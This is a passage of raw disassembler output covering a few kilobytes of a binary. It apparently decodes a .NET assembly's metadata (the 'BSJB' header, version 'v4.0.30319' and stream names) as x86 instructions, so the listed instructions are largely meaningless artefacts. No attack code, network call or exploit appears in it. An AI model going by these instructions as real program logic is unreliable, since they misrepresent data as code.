  404c13:	00 02                	add    %al,(%edx)
  404c15:	00 03                	add    %al,(%ebx)
  404c17:	00 7e 81             	add    %bh,-0x7f(%esi)
  404c1a:	00 14 00             	add    %dl,(%eax,%eax,1)
  404c1d:	00 00                	add    %al,(%eax)
  404c1f:	00 13                	add    %dl,(%ebx)
  404c21:	30 03                	xor    %al,(%ebx)
  404c23:	00 2d 00 00 00 24    	add    %ch,0x24000000
  404c29:	00 00                	add    %al,(%eax)
  404c2b:	11 00                	adc    %eax,(%eax)
  404c2d:	7e 64                	jle    0x404c93
  404c2f:	00 00                	add    %al,(%eax)
  404c31:	0a 0b                	or     (%ebx),%cl
  404c33:	07                   	pop    %es
  404c34:	2c 07                	sub    $0x7,%al
  404c36:	02 28                	add    (%eax),%ch
  404c38:	48                   	dec    %eax
  404c39:	00 00                	add    %al,(%eax)
  404c3b:	0a 00                	or     (%eax),%al
  404c3d:	02 28                	add    (%eax),%ch
  404c3f:	65 00 00             	add    %al,%gs:(%eax)
  404c42:	0a 0a                	or     (%edx),%cl
  404c44:	06                   	push   %es
  404c45:	72 c1                	jb     0x404c08
  404c47:	68 00 70 72 fe       	push   $0xfe727000
  404c4c:	4f                   	dec    %edi
  404c4d:	00 70 6f             	add    %dh,0x6f(%eax)
  404c50:	66 00 00             	data16 add %al,(%eax)
  404c53:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  404c56:	00 08                	add    %cl,(%eax)
  404c58:	2a 2e                	sub    (%esi),%ch
  404c5a:	73 58                	jae    0x404cb4
  404c5c:	00 00                	add    %al,(%eax)
  404c5e:	06                   	push   %es
  404c5f:	80 33 00             	xorb   $0x0,(%ebx)
  404c62:	00 04 2a             	add    %al,(%edx,%ebp,1)
  404c65:	22 02                	and    (%edx),%al
  404c67:	28 25 00 00 0a 00    	sub    %ah,0xa0000
  404c6d:	2a 1a                	sub    (%edx),%bl
  404c6f:	73 39                	jae    0x404caa
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	2a 1a                	sub    (%edx),%bl
  404c76:	73 33                	jae    0x404cab
  404c78:	00 00                	add    %al,(%eax)
  404c7a:	06                   	push   %es
  404c7b:	2a 1a                	sub    (%edx),%bl
  404c7d:	73 36                	jae    0x404cb5
  404c7f:	00 00                	add    %al,(%eax)
  404c81:	06                   	push   %es
  404c82:	2a 1a                	sub    (%edx),%bl
  404c84:	73 3d                	jae    0x404cc3
  404c86:	00 00                	add    %al,(%eax)
  404c88:	06                   	push   %es
  404c89:	2a 1a                	sub    (%edx),%bl
  404c8b:	73 44                	jae    0x404cd1
  404c8d:	00 00                	add    %al,(%eax)
  404c8f:	06                   	push   %es
  404c90:	2a 1a                	sub    (%edx),%bl
  404c92:	73 41                	jae    0x404cd5
  404c94:	00 00                	add    %al,(%eax)
  404c96:	06                   	push   %es
  404c97:	2a 42 53             	sub    0x53(%edx),%al
  404c9a:	4a                   	dec    %edx
  404c9b:	42                   	inc    %edx
  404c9c:	01 00                	add    %eax,(%eax)
  404c9e:	01 00                	add    %eax,(%eax)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	00 00                	add    %al,(%eax)
  404ca4:	0c 00                	or     $0x0,%al
  404ca6:	00 00                	add    %al,(%eax)
  404ca8:	76 34                	jbe    0x404cde
  404caa:	2e 30 2e             	xor    %ch,%cs:(%esi)
  404cad:	33 30                	xor    (%eax),%esi
  404caf:	33 31                	xor    (%ecx),%esi
  404cb1:	39 00                	cmp    %eax,(%eax)
  404cb3:	00 00                	add    %al,(%eax)
  404cb5:	00 05 00 6c 00 00    	add    %al,0x6c00
  404cbb:	00 64 10 00          	add    %ah,0x0(%eax,%edx,1)
  404cbf:	00 23                	add    %ah,(%ebx)
  404cc1:	7e 00                	jle    0x404cc3
  404cc3:	00 d0                	add    %dl,%al
  404cc5:	10 00                	adc    %al,(%eax)
  404cc7:	00 50 0f             	add    %dl,0xf(%eax)
  404cca:	00 00                	add    %al,(%eax)
  404ccc:	23 53 74             	and    0x74(%ebx),%edx
  404ccf:	72 69                	jb     0x404d3a
  404cd1:	6e                   	outsb  %ds:(%esi),(%dx)
  404cd2:	67 73 00             	addr16 jae 0x404cd5
  404cd5:	00 00                	add    %al,(%eax)
  404cd7:	00 20                	add    %ah,(%eax)
  404cd9:	20 00                	and    %al,(%eax)
  404cdb:	00 c8                	add    %cl,%al
  404cdd:	68 00 00 23 55       	push   $0x55230000
  404ce2:	53                   	push   %ebx
  404ce3:	00 e8                	add    %ch,%al
  404ce5:	88 00                	mov    %al,(%eax)
  404ce7:	00 10                	add    %dl,(%eax)
  404ce9:	00 00                	add    %al,(%eax)
  404ceb:	00 23                	add    %ah,(%ebx)
  404ced:	47                   	inc    %edi
  404cee:	55                   	push   %ebp
  404cef:	49                   	dec    %ecx
  404cf0:	44                   	inc    %esp
  404cf1:	00 00                	add    %al,(%eax)
  404cf3:	00 f8                	add    %bh,%al
  404cf5:	88 00                	mov    %al,(%eax)
  404cf7:	00 38                	add    %bh,(%eax)
  404cf9:	05 00 00 23 42       	add    $0x42230000,%eax
  404cfe:	6c                   	insb   (%dx),%es:(%edi)
  404cff:	6f                   	outsl  %ds:(%esi),(%dx)
  404d00:	62 00                	bound  %eax,(%eax)
  404d02:	00 00                	add    %al,(%eax)
  404d04:	00 00                	add    %al,(%eax)
  404d06:	00 00                	add    %al,(%eax)
  404d08:	02 00                	add    (%eax),%al
  404d0a:	00 01                	add    %al,(%ecx)
  404d0c:	57                   	push   %edi
  404d0d:	1f                   	pop    %ds
  404d0e:	a2 1d 09 02 00       	mov    %al,0x2091d
  404d13:	00 00                	add    %al,(%eax)
  404d15:	fa                   	cli
  404d16:	01 33                	add    %esi,(%ebx)
  404d18:	00 16                	add    %dl,(%esi)
  404d1a:	00 00                	add    %al,(%eax)
  404d1c:	01 00                	add    %eax,(%eax)
  404d1e:	00 00                	add    %al,(%eax)
  404d20:	43                   	inc    %ebx
  404d21:	00 00                	add    %al,(%eax)
  404d23:	00 1a                	add    %bl,(%edx)
  404d25:	00 00                	add    %al,(%eax)
  404d27:	00 39                	add    %bh,(%ecx)
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 5e 00             	add    %bl,0x0(%esi)
  404d2e:	00 00                	add    %al,(%eax)
  404d30:	4d                   	dec    %ebp
  404d31:	00 00                	add    %al,(%eax)
  404d33:	00 06                	add    %al,(%esi)
  404d35:	00 00                	add    %al,(%eax)
  404d37:	00 66 00             	add    %ah,0x0(%esi)
  404d3a:	00 00                	add    %al,(%eax)
  404d3c:	0d 00 00 00 15       	or     $0x15000000,%eax
  404d41:	00 00                	add    %al,(%eax)
  404d43:	00 24 00             	add    %ah,(%eax,%eax,1)
  404d46:	00 00                	add    %al,(%eax)
  404d48:	07                   	pop    %es
  404d49:	00 00                	add    %al,(%eax)
  404d4b:	00 08                	add    %cl,(%eax)
  404d4d:	00 00                	add    %al,(%eax)
  404d4f:	00 08                	add    %cl,(%eax)
  404d51:	00 00                	add    %al,(%eax)
  404d53:	00 02                	add    %al,(%edx)
  404d55:	00 00                	add    %al,(%eax)
  404d57:	00 05 00 00 00 03    	add    %al,0x3000000
  404d5d:	00 00                	add    %al,(%eax)
  404d5f:	00 01                	add    %al,(%ecx)
  404d61:	00 00                	add    %al,(%eax)
  404d63:	00 04 00             	add    %al,(%eax,%eax,1)
  404d66:	00 00                	add    %al,(%eax)
  404d68:	04 00                	add    $0x0,%al
  404d6a:	00 00                	add    %al,(%eax)
  404d6c:	00 00                	add    %al,(%eax)
  404d6e:	90                   	nop
  404d6f:	07                   	pop    %es
  404d70:	01 00                	add    %eax,(%eax)
  404d72:	00 00                	add    %al,(%eax)
  404d74:	00 00                	add    %al,(%eax)
  404d76:	06                   	push   %es
  404d77:	00 c5                	add    %al,%ch
  404d79:	06                   	push   %es
  404d7a:	db 0b                	fisttpl (%ebx)
  404d7c:	06                   	push   %es
  404d7d:	00 32                	add    %dh,(%edx)
  404d7f:	07                   	pop    %es
  404d80:	db 0b                	fisttpl (%ebx)
  404d82:	06                   	push   %es
  404d83:	00 de                	add    %bl,%dh
  404d85:	05 79 0b 0f 00       	add    $0xf0b79,%eax
  404d8a:	fb                   	sti
  404d8b:	0b 00                	or     (%eax),%eax
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	00 21                	add    %ah,(%ecx)
  404d91:	06                   	push   %es
  404d92:	9e                   	sahf
  404d93:	09 06                	or     %eax,(%esi)
  404d95:	00 a8 06 9e 09 06    	add    %ch,0x6099e06(%eax)
  404d9b:	00 89 06 9e 09 06    	add    %cl,0x6099e06(%ecx)
  404da1:	00 19                	add    %bl,(%ecx)
  404da3:	07                   	pop    %es
  404da4:	9e                   	sahf
  404da5:	09 06                	or     %eax,(%esi)
  404da7:	00 e5                	add    %ah,%ch
  404da9:	06                   	push   %es
  404daa:	9e                   	sahf
  404dab:	09 06                	or     %eax,(%esi)
  404dad:	00 fe                	add    %bh,%dh
  404daf:	06                   	push   %es
  404db0:	9e                   	sahf
  404db1:	09 06                	or     %eax,(%esi)
  404db3:	00 38                	add    %bh,(%eax)
  404db5:	06                   	push   %es
  404db6:	9e                   	sahf
  404db7:	09 06                	or     %eax,(%esi)
  404db9:	00 0d 06 bc 0b 06    	add    %cl,0x60bbc06
  404dbf:	00 d0                	add    %dl,%al
  404dc1:	05 bc 0b 06 00       	add    $0x60bbc,%eax
  404dc6:	6c                   	insb   (%dx),%es:(%edi)
  404dc7:	06                   	push   %es
  404dc8:	9e                   	sahf
  404dc9:	09 06                	or     %eax,(%esi)
  404dcb:	00 53 06             	add    %dl,0x6(%ebx)
  404dce:	b9 07 06 00 41       	mov    $0x41000607,%ecx
  404dd3:	0d 22 09 0a 00       	or     $0xa0922,%eax
  404dd8:	7a 03                	jp     0x404ddd
  404dda:	96                   	xchg   %eax,%esi
  404ddb:	0d 0a 00 d0 03       	or     $0x3d0000a,%eax
  404de0:	54                   	push   %esp
  404de1:	02 0a                	add    (%edx),%cl
  404de3:	00 db                	add    %bl,%bl
  404de5:	0a 96 0d 06 00 f7    	or     -0x8fff9f3(%esi),%dl
  404deb:	0a 14 0e             	or     (%esi,%ecx,1),%dl
  404dee:	06                   	push   %es
  404def:	00 18                	add    %bl,(%eax)
  404df1:	03 22                	add    (%edx),%esp
  404df3:	09 06                	or     %eax,(%esi)
  404df5:	00 0d 0a 22 09 0a    	add    %cl,0xa09220a
  404dfb:	00 f0                	add    %dh,%al
  404dfd:	09 96 0d 06 00 ec    	or     %edx,-0x13fff9f3(%esi)
  404e03:	08 1f                	or     %bl,(%edi)
  404e05:	02 06                	add    (%esi),%al
  404e07:	00 cf                	add    %cl,%bh
  404e09:	02 c3                	add    %bl,%al
  404e0b:	0e                   	push   %cs
  404e0c:	06                   	push   %es
  404e0d:	00 db                	add    %bl,%bl
  404e0f:	02 c3                	add    %bl,%al
  404e11:	0e                   	push   %cs
  404e12:	06                   	push   %es
  404e13:	00 37                	add    %dh,(%edi)
  404e15:	09 22                	or     %esp,(%edx)
  404e17:	09 06                	or     %eax,(%esi)
  404e19:	00 a3 00 88 02 06    	add    %ah,0x6028800(%ebx)
  404e1f:	00 3c 00             	add    %bh,(%eax,%eax,1)
  404e22:	88 02                	mov    %al,(%edx)
  404e24:	06                   	push   %es
  404e25:	00 4a 00             	add    %cl,0x0(%edx)
  404e28:	88 02                	mov    %al,(%edx)
  404e2a:	06                   	push   %es
  404e2b:	00 b5 05 db 0b 06    	add    %dh,0x60bdb05(%ebp)
  404e31:	00 91 05 79 0b 06    	add    %dl,0x60b7905(%ecx)
  404e37:	00 f2                	add    %dh,%dl
  404e39:	05 79 0b 06 00       	add    $0x60b79,%eax
  404e3e:	35 00 22 09 06       	xor    $0x6092200,%eax
  404e43:	00 10                	add    %dl,(%eax)
  404e45:	08 22                	or     %ah,(%edx)
  404e47:	09 06                	or     %eax,(%esi)
  404e49:	00 c7                	add    %al,%bh
  404e4b:	00 22                	add    %ah,(%edx)
  404e4d:	09 0a                	or     %ecx,(%edx)
  404e4f:	00 61 03             	add    %ah,0x3(%ecx)
  404e52:	29 0a                	sub    %ecx,(%edx)
  404e54:	0a 00                	or     (%eax),%al
  404e56:	c2 0a 54             	ret    $0x540a
  404e59:	02 0a                	add    (%edx),%cl
  404e5b:	00 c2                	add    %al,%dl
  404e5d:	09 54 02 0a          	or     %edx,0xa(%edx,%eax,1)
  404e61:	00 30                	add    %dh,(%eax)
  404e63:	0e                   	push   %cs
  404e64:	54                   	push   %esp
  404e65:	02 06                	add    (%esi),%al
  404e67:	00 7a 00             	add    %bh,0x0(%edx)
  404e6a:	22 09                	and    (%ecx),%cl
  404e6c:	06                   	push   %es
  404e6d:	00 1b                	add    %bl,(%ebx)
  404e6f:	04 22                	add    $0x22,%al
  404e71:	09 0a                	or     %ecx,(%edx)
  404e73:	00 ce                	add    %cl,%dh
  404e75:	0a 29                	or     (%ecx),%ch
  404e77:	0a 0a                	or     (%edx),%cl
  404e79:	00 e3                	add    %ah,%bl
  404e7b:	09 29                	or     %ebp,(%ecx)
  404e7d:	0a 06                	or     (%esi),%al
  404e7f:	00 dc                	add    %bl,%ah
  404e81:	0d 22 09 06 00       	or     $0x60922,%eax
  404e86:	11 0f                	adc    %ecx,(%edi)
  404e88:	68 00 06 00 90       	push   $0x90000600
  404e8d:	08 1f                	or     %bl,(%edi)
  404e8f:	02 0e                	add    (%esi),%cl
  404e91:	00 34 0f             	add    %dh,(%edi,%ecx,1)
  404e94:	70 02                	jo     0x404e98
  404e96:	06                   	push   %es
  404e97:	00 47 0a             	add    %al,0xa(%edi)
  404e9a:	1f                   	pop    %ds
  404e9b:	02 06                	add    (%esi),%al
  404e9d:	00 16                	add    %dl,(%esi)
  404e9f:	04 1f                	add    $0x1f,%al
  404ea1:	02 06                	add    (%esi),%al
  404ea3:	00 9f 03 1f 02 06    	add    %bl,0x6021f03(%edi)
  404ea9:	00 cd                	add    %cl,%ch
  404eab:	0c 1f                	or     $0x1f,%al
  404ead:	02 06                	add    (%esi),%al
  404eaf:	00 14 05 1f 02 06 00 	add    %dl,0x6021f(,%eax,1)
  404eb6:	29 09                	sub    %ecx,(%ecx)
  404eb8:	c3                   	ret
  404eb9:	0e                   	push   %cs
  404eba:	06                   	push   %es
  404ebb:	00 01                	add    %al,(%ecx)
  404ebd:	09 1f                	or     %ebx,(%edi)
  404ebf:	02 06                	add    (%esi),%al
  404ec1:	00 03                	add    %al,(%ebx)
  404ec3:	0e                   	push   %cs
  404ec4:	22 09                	and    (%ecx),%cl
  404ec6:	12 00                	adc    (%eax),%al
  404ec8:	83 0c 58 0d          	orl    $0xd,(%eax,%ebx,2)
  404ecc:	12 00                	adc    (%eax),%al
  404ece:	f8                   	clc
  404ecf:	0e                   	push   %cs
  404ed0:	58                   	pop    %eax
  404ed1:	0d 06 00 b1 0a       	or     $0xab10006,%eax
  404ed6:	22 09                	and    (%ecx),%cl
  404ed8:	06                   	push   %es
  404ed9:	00 5f 0e             	add    %bl,0xe(%edi)
  404edc:	22 09                	and    (%ecx),%cl
  404ede:	06                   	push   %es
  404edf:	00 3c 09             	add    %bh,(%ecx,%ecx,1)
  404ee2:	22 09                	and    (%ecx),%cl
  404ee4:	06                   	push   %es
  404ee5:	00 4a 0b             	add    %cl,0xb(%edx)
  404ee8:	90                   	nop
  404ee9:	0c 06                	or     $0x6,%al
  404eeb:	00 da                	add    %bl,%dl
  404eed:	03 22                	add    (%edx),%esp
  404eef:	09 12                	or     %edx,(%edx)
  404ef1:	00 2e                	add    %ch,(%esi)
  404ef3:	08 79 0b             	or     %bh,0xb(%ecx)
  404ef6:	06                   	push   %es
  404ef7:	00 71 0b             	add    %dh,0xb(%ecx)
  404efa:	22 09                	and    (%ecx),%cl
  404efc:	06                   	push   %es
  404efd:	00 b0 07 14 0e 06    	add    %dh,0x60e1407(%eax)
  404f03:	00 14 0b             	add    %dl,(%ebx,%ecx,1)
  404f06:	22 09                	and    (%ecx),%cl
  404f08:	00 00                	add    %al,(%eax)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	13 01                	adc    (%ecx),%eax
  404f0e:	00 00                	add    %al,(%eax)
  404f10:	00 00                	add    %al,(%eax)
  404f12:	01 00                	add    %eax,(%eax)
  404f14:	01 00                	add    %eax,(%eax)
  404f16:	01 00                	add    %eax,(%eax)
  404f18:	10 00                	adc    %al,(%eax)
  404f1a:	52                   	push   %edx
  404f1b:	03 00                	add    (%eax),%eax
  404f1d:	00 41 00             	add    %al,0x0(%ecx)
  404f20:	01 00                	add    %eax,(%eax)
  404f22:	01 00                	add    %eax,(%eax)
  404f24:	01 00                	add    %eax,(%eax)
  404f26:	10 00                	adc    %al,(%eax)
  404f28:	48                   	dec    %eax
  404f29:	0d 00 00 41 00       	or     $0x410000,%eax
  404f2e:	01 00                	add    %eax,(%eax)
  404f30:	08 00                	or     %al,(%eax)
  404f32:	01 00                	add    %eax,(%eax)
  404f34:	10 00                	adc    %al,(%eax)
  404f36:	37                   	aaa
  404f37:	09 00                	or     %eax,(%eax)
  404f39:	00 41 00             	add    %al,0x0(%ecx)
  404f3c:	01 00                	add    %eax,(%eax)
  404f3e:	0a 00                	or     (%eax),%al
  404f40:	01 00                	add    %eax,(%eax)
  404f42:	10 00                	adc    %al,(%eax)
  404f44:	fe 03                	incb   (%ebx)
  404f46:	00 00                	add    %al,(%eax)
  404f48:	41                   	inc    %ecx
  404f49:	00 01                	add    %al,(%ecx)
  404f4b:	00 10                	add    %dl,(%eax)
  404f4d:	00 01                	add    %al,(%ecx)
  404f4f:	00 10                	add    %dl,(%eax)
  404f51:	00 ab 0a 00 00 41    	add    %ch,0x4100000a(%ebx)
  404f57:	00 08                	add    %cl,(%eax)
  404f59:	00 14 00             	add    %dl,(%eax,%eax,1)
  404f5c:	01 00                	add    %eax,(%eax)
  404f5e:	10 00                	adc    %al,(%eax)
  404f60:	0e                   	push   %cs
  404f61:	03 00                	add    (%eax),%eax
  404f63:	00 41 00             	add    %al,0x0(%ecx)
  404f66:	09 00                	or     %eax,(%eax)
  404f68:	1b 00                	sbb    (%eax),%eax
  404f6a:	01 00                	add    %eax,(%eax)
  404f6c:	10 00                	adc    %al,(%eax)
  404f6e:	ac                   	lods   %ds:(%esi),%al
  404f6f:	07                   	pop    %es
  404f70:	00 00                	add    %al,(%eax)
  404f72:	41                   	inc    %ecx
  404f73:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404f76:	1f                   	pop    %ds
  404f77:	00 01                	add    %al,(%ecx)
  404f79:	00 10                	add    %dl,(%eax)
  404f7b:	00 43 0b             	add    %al,0xb(%ebx)
  404f7e:	00 00                	add    %al,(%eax)
  404f80:	41                   	inc    %ecx
  404f81:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404f84:	20 00                	and    %al,(%eax)
  404f86:	01 00                	add    %eax,(%eax)
  404f88:	10 00                	adc    %al,(%eax)
  404f8a:	19 0d 00 00 41 00    	sbb    %ecx,0x410000
  404f90:	16                   	push   %ss
  404f91:	00 2a                	add    %ch,(%edx)
  404f93:	00 00                	add    %al,(%eax)
  404f95:	00 10                	add    %dl,(%eax)
  404f97:	00 08                	add    %cl,(%eax)
  404f99:	09 3f                	or     %edi,(%edi)
  404f9b:	02 41 00             	add    0x0(%ecx),%al
  404f9e:	16                   	push   %ss
  404f9f:	00 2e                	add    %ch,(%esi)
  404fa1:	00 01                	add    %al,(%ecx)
  404fa3:	00 10                	add    %dl,(%eax)
  404fa5:	00 88 07 8c 0b 41    	add    %cl,0x410b8c07(%eax)
  404fab:	00 16                	add    %dl,(%esi)
  404fad:	00 31                	add    %dh,(%ecx)
  404faf:	00 01                	add    %al,(%ecx)
  404fb1:	00 10                	add    %dl,(%eax)
  404fb3:	00 b6 08 8c 0b 41    	add    %dh,0x410b8c08(%esi)
  404fb9:	00 16                	add    %dl,(%esi)
  404fbb:	00 34 00             	add    %dh,(%eax,%eax,1)
  404fbe:	01 00                	add    %eax,(%eax)
  404fc0:	10 00                	adc    %al,(%eax)
  404fc2:	8a 05 8c 0b 41 00    	mov    0x410b8c,%al
  404fc8:	16                   	push   %ss
  404fc9:	00 37                	add    %dh,(%edi)
  404fcb:	00 01                	add    %al,(%ecx)
  404fcd:	00 10                	add    %dl,(%eax)
  404fcf:	00 a8 05 8c 0b 41    	add    %ch,0x410b8c05(%eax)
  404fd5:	00 20                	add    %ah,(%eax)
  404fd7:	00 3b                	add    %bh,(%ebx)
  404fd9:	00 a1 00 10 00 58    	add    %ah,0x58001000(%ecx)
  404fdf:	03 8c 0b 00 00 20 00 	add    0x200000(%ebx,%ecx,1),%ecx
  404fe6:	3e 00 01             	add    %al,%ds:(%ecx)
  404fe9:	00 10                	add    %dl,(%eax)
  404feb:	00 4d 05             	add    %cl,0x5(%ebp)
  404fee:	8c 0b                	mov    %cs,(%ebx)
  404ff0:	41                   	inc    %ecx
  404ff1:	00 20                	add    %ah,(%eax)
  404ff3:	00 3f                	add    %bh,(%edi)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 10                	add    %dl,(%eax)
  404ff9:	00 50 0d             	add    %dl,0xd(%eax)
  404ffc:	8c 0b                	mov    %cs,(%ebx)
  404ffe:	41                   	inc    %ecx
  404fff:	00 20                	add    %ah,(%eax)
  405001:	00 42 00             	add    %al,0x0(%edx)
  405004:	81 01 10 00 05 0b    	addl   $0xb050010,(%ecx)
  40500a:	2e 0c 41             	cs or  $0x41,%al
  40500d:	00 20                	add    %ah,(%eax)
  40500f:	00 45 00             	add    %al,0x0(%ebp)
  405012:	01 00                	add    %eax,(%eax)
  405014:	10 00                	adc    %al,(%eax)
  405016:	81 0d 2e 0c 41 00 20 	orl    $0x460020,0x410c2e
  40501d:	00 46 00 
  405020:	01 00                	add    %eax,(%eax)
  405022:	10 00                	adc    %al,(%eax)
  405024:	b0 09                	mov    $0x9,%al
  405026:	2e 0c 41             	cs or  $0x41,%al
  405029:	00 22                	add    %ah,(%edx)
  40502b:	00 4b 00             	add    %cl,0x0(%ebx)
  40502e:	81 01 10 00 4b 0a    	addl   $0xa4b0010,(%ecx)
  405034:	2e 0c 41             	cs or  $0x41,%al
  405037:	00 23                	add    %ah,(%ebx)
  405039:	00 4d 00             	add    %cl,0x0(%ebp)
  40503c:	02 01                	add    (%ecx),%al
  40503e:	00 00                	add    %al,(%eax)
  405040:	18 02                	sbb    %al,(%edx)
  405042:	00 00                	add    %al,(%eax)
  405044:	6d                   	insl   (%dx),%es:(%edi)
  405045:	00 23                	add    %ah,(%ebx)
  405047:	00 4f 00             	add    %cl,0x0(%edi)
  40504a:	82 01 10             	addb   $0x10,(%ecx)
  40504d:	00 79 07             	add    %bh,0x7(%ecx)
  405050:	00 00                	add    %al,(%eax)
  405052:	41                   	inc    %ecx
  405053:	00 31                	add    %dh,(%ecx)
  405055:	00 4f 00             	add    %cl,0x0(%edi)
  405058:	82 01 10             	addb   $0x10,(%ecx)
  40505b:	00 58 00             	add    %bl,0x0(%eax)
  40505e:	00 00                	add    %al,(%eax)
  405060:	41                   	inc    %ecx
  405061:	00 33                	add    %dh,(%ebx)
  405063:	00 50 00             	add    %dl,0x0(%eax)
  405066:	03 21                	add    (%ecx),%esp
  405068:	10 00                	adc    %al,(%eax)
  40506a:	84 02                	test   %al,(%edx)
  40506c:	00 00                	add    %al,(%eax)
  40506e:	41                   	inc    %ecx
  40506f:	00 33                	add    %dh,(%ebx)
  405071:	00 57 00             	add    %dl,0x0(%edi)
  405074:	16                   	push   %ss
  405075:	00 4b 04             	add    %cl,0x4(%ebx)
  405078:	8f 00                	pop    (%eax)
  40507a:	16                   	push   %ss
  40507b:	00 c2                	add    %al,%dl
  40507d:	02 8f 00 16 00 8b    	add    -0x74ffea00(%edi),%cl
  405083:	08 8f 00 16 00 5b    	or     %cl,0x5b001600(%edi)
  405089:	0c 8f                	or     $0x8f,%al
  40508b:	00 16                	add    %dl,(%esi)
  40508d:	00 9e 07 4e 03 16    	add    %bl,0x16034e07(%esi)
  405093:	00 18                	add    %bl,(%eax)
  405095:	00 8f 00 16 00 07    	add    %cl,0x7001600(%edi)
  40509b:	01 8f 00 16 00 02    	add    %ecx,0x2001600(%edi)
  4050a1:	0d f7 02 16 00       	or     $0x1602f7,%eax
  4050a6:	73 05                	jae    0x4050ad
  4050a8:	51                   	push   %ecx
  4050a9:	03 16                	add    (%esi),%edx
  4050ab:	00 f6                	add    %dh,%dh
  4050ad:	03 51 03             	add    0x3(%ecx),%edx
  4050b0:	16                   	push   %ss
  4050b1:	00 a4 0a 51 03 16 00 	add    %ah,0x160351(%edx,%ecx,1)
  4050b8:	e9 02 f7 02 16       	jmp    0x164347bf
  4050bd:	00 3b                	add    %bh,(%ebx)
  4050bf:	02 8f 00 16 00 8d    	add    -0x72ffea00(%edi),%cl
  4050c5:	03 8f 00 16 00 84    	add    -0x7bffea00(%edi),%ecx
  4050cb:	04 8f                	add    $0x8f,%al
  4050cd:	00 16                	add    %dl,(%esi)
  4050cf:	00 72 09             	add    %dh,0x9(%edx)
  4050d2:	8f 00                	pop    (%eax)
  4050d4:	16                   	push   %ss
  4050d5:	00 bb 04 8f 00 16    	add    %bh,0x16008f04(%ebx)
  4050db:	00 b6 0a 55 03 16    	add    %dh,0x1603550a(%esi)
  4050e1:	00 08                	add    %cl,(%eax)
  4050e3:	02 f7                	add    %bh,%dh
  4050e5:	02 16                	add    (%esi),%dl
  4050e7:	00 9a 01 8f 00 16    	add    %bl,0x16008f01(%edx)
  4050ed:	00 ac 01 55 03 16 00 	add    %ch,0x160355(%ecx,%eax,1)
  4050f4:	81 01 55 03 16 00    	addl   $0x160355,(%ecx)
  4050fa:	74 08                	je     0x405104
  4050fc:	8f 00                	pop    (%eax)
  4050fe:	16                   	push   %ss
  4050ff:	00 44 0c 8f          	add    %al,-0x71(%esp,%ecx,1)
  405103:	00 16                	add    %dl,(%esi)
  405105:	00 23                	add    %ah,(%ebx)
  405107:	04 8f                	add    $0x8f,%al
  405109:	00 16                	add    %dl,(%esi)
  40510b:	00 42 05             	add    %al,0x5(%edx)
  40510e:	8f 00                	pop    (%eax)
  405110:	16                   	push   %ss
  405111:	00 21                	add    %ah,(%ecx)
  405113:	08 8f 00 16 00 25    	or     %cl,0x25001600(%edi)
  405119:	01 8f 00 16 00 1c    	add    %ecx,0x1c001600(%edi)
  40511f:	01 8f 00 16 00 17    	add    %ecx,0x17001600(%edi)
  405125:	0a 8f 00 16 00 fe    	or     -0x1ffea00(%edi),%cl
  40512b:	01 8f 00 21 00 1d    	add    %ecx,0x1d002100(%edi)
  405131:	03 f7                	add    %edi,%esi
  405133:	02 21                	add    (%ecx),%ah
  405135:	00 37                	add    %dh,(%edi)
  405137:	03 58 03             	add    0x3(%eax),%ebx
  40513a:	21 00                	and    %eax,(%eax)
  40513c:	9f                   	lahf
  40513d:	0b 60 03             	or     0x3(%eax),%esp
  405140:	06                   	push   %es
  405141:	06                   	push   %es
  405142:	49                   	dec    %ecx
  405143:	02 55 03             	add    0x3(%ebp),%dl
  405146:	56                   	push   %esi
  405147:	80 6e 07 6e          	subb   $0x6e,0x7(%esi)
  40514b:	03 56 80             	add    -0x80(%esi),%edx
  40514e:	65 07                	gs pop %es
  405150:	6e                   	outsb  %ds:(%esi),(%dx)
  405151:	03 56 80             	add    -0x80(%esi),%edx
  405154:	7d 0e                	jge    0x405164
  405156:	6e                   	outsb  %ds:(%esi),(%dx)
  405157:	03 56 80             	add    -0x80(%esi),%edx
  40515a:	29 0d 6e 03 56 80    	sub    %ecx,0x8056036e
  405160:	bc 0e 6e 03 56       	mov    $0x56036e0e,%esp
  405165:	80 bc 08 6e 03 56 80 	cmpb   $0x65,-0x7fa9fc92(%eax,%ecx,1)
  40516c:	65 
  40516d:	0e                   	push   %cs
  40516e:	6e                   	outsb  %ds:(%esi),(%dx)
  40516f:	03 56 80             	add    -0x80(%esi),%edx
  405172:	71 0e                	jno    0x405182
  405174:	6e                   	outsb  %ds:(%esi),(%dx)
  405175:	03 56 80             	add    -0x80(%esi),%edx
  405178:	b2 0b                	mov    $0xb,%dl
  40517a:	6e                   	outsb  %ds:(%esi),(%dx)
  40517b:	03 56 80             	add    -0x80(%esi),%edx
  40517e:	a3 02 6e 03 56       	mov    %eax,0x56036e02
  405183:	80 af 05 6e 03 56 80 	subb   $0x80,0x56036e05(%edi)
  40518a:	54                   	push   %esp
  40518b:	07                   	pop    %es
  40518c:	6e                   	outsb  %ds:(%esi),(%dx)
  40518d:	03 56 80             	add    -0x80(%esi),%edx
  405190:	d8 0c 6e             	fmuls  (%esi,%ebp,2)
  405193:	03 16                	add    (%esi),%edx
  405195:	00 c4                	add    %al,%ah
  405197:	01 72 03             	add    %esi,0x3(%edx)
  40519a:	16                   	push   %ss
  40519b:	00 29                	add    %ch,(%ecx)
  40519d:	02 72 03             	add    0x3(%edx),%dh
  4051a0:	36 00 0f             	add    %cl,%ss:(%edi)
  4051a3:	01 75 03             	add    %esi,0x3(%ebp)
  4051a6:	16                   	push   %ss
  4051a7:	00 01                	add    %al,(%ecx)
  4051a9:	00 79 03             	add    %bh,0x3(%ecx)
  4051ac:	16                   	push   %ss
  4051ad:	00 1e                	add    %bl,(%esi)
  4051af:	00 79 03             	add    %bh,0x3(%ecx)
  4051b2:	16                   	push   %ss
  4051b3:	00 8c 00 79 03 16 00 	add    %cl,0x160379(%eax,%eax,1)
  4051ba:	b0 00                	mov    $0x0,%al
  4051bc:	79 03                	jns    0x4051c1
  4051be:	16                   	push   %ss
  4051bf:	00 d9                	add    %bl,%cl
  4051c1:	00 79 03             	add    %bh,0x3(%ecx)
  4051c4:	16                   	push   %ss
  4051c5:	00 f0                	add    %dh,%al
